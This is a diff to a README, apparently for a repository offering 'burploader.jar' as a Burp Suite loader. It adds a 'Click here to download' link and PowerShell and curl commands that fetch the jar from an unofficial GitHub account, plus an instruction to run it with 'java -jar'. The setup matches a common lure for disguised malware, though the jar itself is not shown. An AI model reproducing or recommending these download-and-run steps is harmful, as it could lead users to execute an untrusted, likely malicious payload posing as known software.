@@ -8,6 +8,10 @@
 
 ## Download
 
+**[Click here to download](https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar)** — save as `burploader.jar`, then run with `java -jar burploader.jar`.
+
+### Command-line Download
+
 **Windows (PowerShell):**
 ```powershell
 powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -OutFile burploader.jar"
@@ -18,7 +22,7 @@ powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/b
 curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -o burploader.jar
 ```
 
-## Download & Run
+### Command-line Download & Run
 
 **Windows (PowerShell):**
 ```powershell
